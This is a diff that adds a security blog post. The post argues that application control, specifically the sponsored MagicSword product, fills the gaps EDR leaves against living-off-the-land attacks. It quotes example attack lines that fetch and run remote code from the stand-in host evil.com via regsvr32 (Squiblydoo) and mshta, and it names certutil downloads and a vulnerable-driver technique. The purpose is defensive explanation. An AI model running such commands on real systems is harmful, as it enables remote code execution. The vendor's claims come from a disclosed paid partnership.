@@ -1,0 +1,204 @@
+---
+title: "Why Your EDR Needs a Partner: The Case for Application Control"
+subtitle: "How threat intelligence-aware application control fills the gaps that EDR leaves open"
+date: "2026-01-07"
+image: "/images/blog/app_control+edr.png"
+tags: [EDR, application control, LOLBAS, security, defense-in-depth]
+---
+
+# Why Your EDR Needs a Partner: The Case for Application Control
+
+Endpoint Detection and Response (EDR) has become a cornerstone of modern security operations. At the EDR Telemetry Project, our goal is to provide objective, hands-on analysis of the telemetry different EDR solutions provide. We never claim one vendor is better than another; instead, we believe the "best" EDR depends entirely on a security team's specific needs, resources, and risk appetite. To that end, we recently launched <a href="http://edr-comparison.com/" target="_blank" rel="noopener noreferrer">EDR-comparison.com</a>, a service designed to help organizations navigate this complex landscape. However, our research consistently shows that no single EDR can be a silver bullet. True resilience requires a layered defense, and in this post, we'll explore the inherent gaps in EDR and make the case for a powerful and affordable compensating layer: Application Control.
+
+> **Quick Note:** I've partnered with MagicSword to offer readers of the EDR Telemetry Project an exclusive discount on their application control solution. While this post discusses application control as a complementary technology to EDR, my analysis of EDR capabilities and limitations remains independent and objective, based on extensive hands-on research.
+
+---
+
+## Key Findings at a Glance
+
+- **Trust is the New Vulnerability:** Attackers have shifted from custom malware to "Living Off the Land" (LOLBAS), abusing over 200+ legitimate Microsoft binaries that EDRs are hard-wired to trust.
+- **The EDR Prevention Dilemma:** EDR vendors often default to "log-only" for legitimate tools (like PowerShell or RMMs) because blocking them risks disrupting business operations.
+- **Signatures Are Not Enough:** With 505+ known vulnerable drivers and widespread RMM abuse, a valid digital signature is no longer a guarantee of a safe execution of unknown binaries.
+- **The Missing Layer:** EDR provides necessary visibility, but struggles with *prevention* regarding trusted tools. Application Control fills this gap by enforcing policies based on threat intelligence, not just file reputation.
+
+---
+
+## The Real-World Gaps in EDR
+
+EDR solutions are designed to detect malicious activity by monitoring endpoint and network events. However, they face a fundamental challenge that no amount of machine learning or behavioral analysis can fully overcome: distinguishing between legitimate administrative activity and that same activity performed with malicious intent.
+
+### The Living Off the Land Problem
+
+The attack landscape has fundamentally shifted. Modern attackers no longer need to write custom malware or drop suspicious executables on disk. Instead, they abuse "Living Off the Land Binaries and Scripts" (LOLBAS) — legitimate, trusted tools that are already present on the system and signed by reputable vendors. Research shows that **84% of high-severity breaches now involve LOLBAS techniques** [1].
+
+This creates an impossible dilemma for EDR solutions: how do you distinguish between a system administrator legitimately using PowerShell for automation versus an attacker using the exact same PowerShell commands for lateral movement? Or between IT deploying TeamViewer for remote support versus an attacker using TeamViewer as their command and control channel?
+
+The LOLBAS project has documented over 200 legitimate Windows binaries that attackers commonly abuse, including:
+
+- **Remote Management Tools (RMM)**: Attackers deploy tools like AnyDesk, TeamViewer, or ScreenConnect that organizations never authorized, but EDR sees them as legitimately signed applications from trusted vendors
+- **Vulnerable Drivers (BYOVD)**: Attackers bring legitimate, signed drivers with known vulnerabilities to disable security controls — EDR trusts the vendor signature even though the driver will be used to kill the EDR process itself
+- **Administrative Binaries**: Tools like `certutil.exe`, `regsvr32.exe`, `mshta.exe`, and `rundll32.exe` used outside their intended purpose (downloading payloads instead of managing certificates, executing scripts instead of registering DLLs)
+- **Scripting Engines**: PowerShell, WMI, and Windows Script Host used for execution, persistence, and lateral movement
+
+For an EDR, all of these activities involve legitimately signed, trusted code. The signature is valid. The binary is clean. The hash is known-good. While top-tier EDRs are **technically capable of detecting these nuances, doing so requires aggressive tuning** that often generates false positives capable of crippling business operations.
+
+### The EDR Detection Gaps: Why LOLBAS Techniques Succeed
+
+![The EDR Gap - Visual representation of detection challenges](/images/blog/the-edr-gap.png)
+
+EDR solutions face fundamental challenges when attackers abuse legitimate tools. Here are the key gaps that enable LOLBAS-based attacks:
+
+| Attack Technique | What EDR Sees | The Context Gap | Why It's a Gap |
+|------------------|---------------|-----------------|----------------|
+| **Unauthorized RMM Deployment** | <CheckIcon /> Validly signed binary<br/><CheckIcon /> Normal RDP network connections<br/><CheckIcon /> Standard installation process | <WarnIcon /> Hard to distinguish authorized IT support from unauthorized attacker access without strict policy | Blocking RMMs often breaks legitimate remote support workflows |
+| **BYOVD (Bring Your Own Vulnerable Driver)** | <CheckIcon /> Validly signed driver<br/><CheckIcon /> Standard driver loading behavior<br/><CheckIcon /> No malicious code in the driver | <WarnIcon /> Driver is legitimate code, but contains vulnerabilities (CVEs) that allow EDR bypass | Vendors hesitate to block valid signatures globally to avoid compatibility issues |
+| **Living Off the Land Binaries** | <CheckIcon /> Microsoft-signed Windows binaries<br/><CheckIcon /> Standard process execution<br/><CheckIcon /> Common administrative activity | <WarnIcon /> *certutil* or *regsvr32* are executing normally, just with malicious arguments | Blocking admin tools can stop sysadmins from doing their jobs |
+| **PowerShell/WMI Abuse** | <CheckIcon /> Legitimate Windows scripting engines<br/><CheckIcon /> Could be sysadmin automation<br/><CheckIcon /> Encoded commands are common | <WarnIcon /> Distinguish admin scripts from attack scripts<br/><WarnIcon /> Remote execution for lateral movement | Behavioral patterns overlap with legitimate IT operations |
+| **Legitimate Tool Misuse** | <CheckIcon /> Approved application (7-Zip, WinRAR)<br/><CheckIcon /> Valid digital signature<br/><CheckIcon /> Normal file operations | <WarnIcon /> Used to exfiltrate data as compressed archives<br/><WarnIcon /> Used in unexpected contexts or by unexpected users<br/><WarnIcon /> Part of multi-stage attack chain | Same tool, same binary, different intent |
+
+### The Fear of Prevention: Why EDRs Operate Conservatively
+
+To combat the ambiguity of LOLBAS, EDR vendors could tune their detection logic to be more aggressive. However, this often leads to a surge in false positives, overwhelming security teams with alerts that are not actionable. This is the central dilemma for EDR providers: prevention is a dangerous game. A single false positive that blocks a critical business application, legitimate PowerShell script, or authorized RMM tool used by IT support can lead to significant operational disruption and intense customer complaints.
+
+As a result, many vendors are understandably conservative with prevention and prefer to operate in a "log-only" or "detect-only" mode when they are unsure. This trade-off between safety and security means that LOLBAS techniques are often only logged, not stopped, leaving the burden of discovery and response entirely on the analyst. Thankfully, effective compensating mechanisms are available for security teams to fill this gap, and they don't have to break the bank.
+
+### Command-Line Fragmentation and Telemetry Gaps
+
+Furthermore, EDR telemetry is not always perfect. We've observed that command-line arguments can be fragmented or omitted entirely, especially when attackers use special characters or built-in shell commands that are interpreted by `cmd.exe` before the final process is even created [2]. A simple yet effective example is the use of the `&&` operator to chain commands. An attacker might execute:
+
+```bash
+echo "running..." && whoami
+```
+
+Because `echo` is a built-in command, `cmd.exe` processes it directly without spawning a new process that an EDR can easily monitor. As a result, many EDR logs will show only the `whoami` process creation event. The preceding `echo` command, which could have been used for staging or logging purposes by the attacker, is completely absent from the telemetry. This creates a critical blind spot, as investigators have an incomplete picture of the attacker's activities and may miss the initial steps of a more complex execution chain.
+
+---
+
+## The Missing Layer: Threat Intelligence-Aware Prevention with Application Control
+
+This is where **Application Control** fundamentally changes the game — but not the traditional "block everything" approach that failed in the past. Modern application control, specifically **MagicSword**, operates on a different principle: **threat intelligence-aware prevention**.
+
+Instead of just asking "Is this signed?" or "Is this malicious?", MagicSword leverages curated threat intelligence from the LOLBAS, LOLDrivers, and LOLRMM projects to ask:
+
+- "Is this binary documented as commonly abused?" (Check against 200+ LOLBAS entries)
+- "Is this driver known to have exploitable vulnerabilities?" (Check against 505 LOLDrivers)
+- "Is this RMM tool authorized for this environment?" (Check against policy and 284 LOLRMM entries)
+- "Is this usage pattern consistent with how attackers abuse this tool?" (Check against documented abuse techniques)
+
+| Scenario | EDR Role (Detection & Response) | MagicSword (Prevention & Policy) |
+|----------|--------------------------------|----------------------------------|
+| **Unauthorized RMM** (AnyDesk deployed via phishing) | **Logs/Alerts:** Records installation and connection. May alert if behavior deviates from baseline, but often allows execution to prevent business disruption. | **Blocks**: Denies execution because the specific RMM hash/signer is not on the approved "Allow List" for this department. |
+| **BYOVD Attack** (RTCore64.sys loaded to disable security) | **Monitors:** Sees driver load. Advanced EDRs may block known bad hashes, but new or obscure vulnerable drivers often slip past signature checks. | **Blocks**: Cross-references the driver against the LOLDrivers database. Blocks loading based on known vulnerability status, regardless of valid signature. |
+| **LOLBAS Abuse** (certutil downloading payload) | **Analyzes:** Looks for malicious command chains. Detection depends on the specific arguments and telemetry visibility. | **Blocks**: Prevents the tool from executing specific arguments (e.g., certutil downloading files) based on documented abuse patterns. |
+| **PowerShell Execution** (Encoded command for persistence) | **Logs/Alerts:** Behavioral analysis of script content and execution of suspicious arguments (e.g., catching the encoded command) | **Blocks**: Based on context — execution origin, user, encoded commands against baseline |
+
+By leveraging threat intelligence from documented abuse patterns and enforcing what can and cannot execute **based on known attacker techniques**, Application Control tools solve the problems that EDRs struggle with. They don't need to interpret behavior or intent; they simply enforce policies informed by real-world abuse data from the LOLBAS, LOLDrivers, and LOLRMM projects. This dramatically reduces the attack surface and stops threats before they can even begin.
+
+---
+
+## A Real-World Attack Chain: LOLBAS Techniques in Action
+
+Consider how a modern ransomware attack unfolds using only legitimate, signed tools documented in the LOLBAS and LOLDrivers projects:
+
+### Step 1: Initial Access — Phishing RMM Tool
+
+User clicks a link that downloads and installs **AnyDesk** (legitimately signed by AnyDesk GmbH, documented in LOLRMM). The installer is clean, the signature is valid, but your organization never authorized this RMM tool.
+
+**EDR Response**: Logs the installation. May generate low-priority alert for "new software installed" but cannot confidently block without risking false positives on legitimate software installs.
+
+**MagicSword Response**: **BLOCKED** — AnyDesk cross-referenced with LOLRMM database, not in the approved RMM tools list. Installation prevented at execution.
+
+---
+
+### Step 2: Defense Evasion — BYOVD
+
+The attacker (unable to install AnyDesk) pivots to using **certutil.exe** to download a vulnerable driver **RTCore64.sys** (documented in LOLDrivers with CVE-2019-16098). Certutil is a Microsoft-signed binary, and the driver is legitimately signed by MSI.
+
+**EDR Response**: Sees Microsoft-signed certutil performing network operations (could be legitimate cert management). Trusts MSI signature on driver. May detect suspicious behavior *after* driver loads, but damage window exists.
+
+**MagicSword Response**: **BLOCKED** at two points:
+
+1. Certutil usage matches LOLBAS documented abuse technique (download function) → Blocked
+2. If payload retrieved by other means, RTCore64.sys flagged in LOLDrivers database → Driver loading blocked
+
+---
+
+### Step 3: Execution & Persistence
+
+Unable to disable defenses, the attacker uses **regsvr32.exe** with the "Squiblydoo" technique (documented in LOLBAS) to execute a remote script and establish persistence via WMI event subscription.
+
+**EDR Response**: Sees Microsoft-signed regsvr32.exe and WMI activity. Both are common administrative tools and operations, difficult to distinguish from legitimate IT activity without complex behavioral analysis.
+
+**MagicSword Response**: **BLOCKED** — `regsvr32.exe /s /n /u /i:http://` usage pattern matches LOLBAS-documented Squiblydoo technique. Script execution prevented.
+
+---
+
+**The Result**: With MagicSword, the attack is stopped at **multiple independent chokepoints** using threat intelligence from LOLBAS, LOLDrivers, and LOLRMM projects. Any one block breaks the attack chain. The EDR never faces the difficult decision of blocking potentially legitimate activity because the execution was prevented based on documented abuse patterns, not guesswork.
+
+---
+
+## MagicSword: Threat Intelligence-Driven Application Control
+
+In our testing of MagicSword, we looked at how it addresses the specific "trust gap" that EDR leaves open. Rather than relying on the traditional "allowlisting" model, which is historically difficult to maintain, MagicSword integrates directly with the community research projects that track these threats. It addresses the specific gap of **LOLBAS abuse** that EDRs cannot reliably prevent. Drawing directly from the research that powers the **LOLBAS**, **LOLDrivers**, and **LOLRMM** projects, MagicSword brings a threat intelligence-driven approach to application control.
+
+**How it works:** Instead of asking "Is this file malicious?", the engine asks, "Is this tool being used in a way that matches documented abuse?"
+
+### Key Differentiators
+
+**1. LOLBAS Intelligence Integration:** The system incorporates the LOLBAS project database. When a binary like `certutil.exe` attempts to download a file, MagicSword recognizes this is a documented abuse technique and can block it based on the behavior, not just the binary hash.
+
+**2. Vulnerable Driver Blocklist:** By integrating the LOLDrivers project (505+ vulnerable drivers), it enforces a policy that overrides the valid vendor signature. If a driver is known to be vulnerable, it cannot load, preventing the "Bring Your Own Vulnerable Driver" attack that often kills EDR agents.
+
+**3. RMM Policy Enforcement:** Rather than chasing behavior, it allows you to define a binary policy (e.g. Only ConnectWise is allowed). If an attacker tries to drop AnyDesk or ScreenConnect, it is blocked pre-execution, regardless of whether the software itself is "clean."
+
+**4. Abuse Technique Awareness:** It distinguishes between use and abuse. In our tests, we verified that while standard usage of tools like regsvr32 was allowed, specific abuse patterns like the below examples were identified and blocked.
+
+- `regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll` matches the LOLBAS-documented "Squiblydoo" technique → Blocked
+- `mshta.exe http://evil.com/payload.hta` matches documented HTA execution abuse → Blocked
+- Normal usage of these same tools for legitimate purposes → Allowed
+
+**5. Audit-First Deployment:** Crucially, it solves the deployment headache by starting in audit mode. It discovers which LOLBAS techniques and drivers are actually in use in your environment, allowing you to create policies informed by your specific baseline before moving to enforcement.
+
+### Why Traditional Application Control Failed
+
+For many security teams, "application control" brings to mind the nightmare of legacy allowlisting. These traditional solutions often failed because they:
+
+- **Required Massive Overhead:** Manually building and maintaining lists of every single approved application version was unsustainable.
+- **Broke Critical Workflows:** Legitimate new software or updates were blocked by default, causing IT tickets to spike.
+- **Lacked Nuance:** They operated on binary "block all" or "allow all" logic. You couldn't allow `certutil` for certs but block it for downloads.
+
+### How Modern Approaches Differ
+
+This is where the shift to *threat intelligence-driven* control is distinct. MagicSword solves the historical usability problems by:
+
+- **Starting with Intelligence:** Instead of an empty list, it starts with pre-configured policies based on real-world abuse patterns from LOLBAS, LOLDrivers, and LOLRMM.
+- **Learning Your Environment:** It uses an "Audit Mode" to discover what tools you actually use before enforcement begins, preventing the "day one" breakage typical of older tools.
+- **Context-Aware Rules:** It moves beyond binary blocking to allow legitimate use while blocking specific abuse patterns (as seen in the `certutil` example).
+- **Automatic Updates:** Protection against new abuse techniques is pushed automatically, similar to AV definitions.
+- **Minimal Overhead:** In our review, maintenance dropped to roughly 2 hours/month after the initial learning period.
+
+---
+
+## EDR + Application Control: A Powerful Partnership
+
+EDR is an indispensable tool for modern security teams, providing the visibility needed to hunt for threats and respond to incidents. However, it should not be the only layer of defense. By pairing your EDR with a threat intelligence-aware Application Control solution like <a href="https://portal.magicsword.io/?utm_source=kostas" target="_blank" rel="noopener noreferrer">MagicSword</a>, you can create a robust, defense-in-depth strategy that addresses the specific problem of LOLBAS abuse.
+
+This layered approach:
+
+- **Hardens endpoints** by preventing unauthorized RMM tools, vulnerable drivers, and documented LOLBAS techniques
+- **Reduces alert fatigue** by blocking attacks before they generate EDR alerts
+- **Allows your security team to focus** on high-fidelity threats instead of investigating legitimate tools
+- **Leverages community intelligence** from LOLBAS, LOLDrivers, and LOLRMM projects that document real-world abuse patterns
+
+As a final note, we believe in providing practical resources for the community. For those interested in exploring how a tool like <a href="https://portal.magicsword.io/?utm_source=kostas" target="_blank" rel="noopener noreferrer">MagicSword</a> can fit into their environment, I've arranged a **25% discount for readers on up to 100 endpoints**. You can use the code **`KOSTAS25`** when signing up.
+
+---
+
+## ReferencesHi 
+
+1. Vectra AI. (n.d.). Living off the land: How attackers hide in legitimate tools. Retrieved from https://www.vectra.ai/topics/living-off-the-land
+2. Kostas. (2024, October 3). Unintentional Evasion: Investigating Command Line Logging Gaps. Detect FYI. Retrieved from https://detect.fyi/unintentional-evasion-investigating-how-cmd-fragmentation-hampers-detection-response-e5d7b465758e
+3. MagicSword. (n.d.). Application Control Made Simple. Retrieved from https://portal.magicsword.io/?utm_source=kostas
+4. LOLBAS Project. (n.d.). Living Off The Land Binaries, Scripts and Libraries. Retrieved from https://lolbas-project.github.io
+5. LOLDrivers Project. (n.d.). Living Off The Land Drivers. Retrieved from https://www.loldrivers.io
+6. LOLRMM Project. (n.d.). Living Off The Land Remote Management Monitoring. Retrieved from https://lolrmm.io
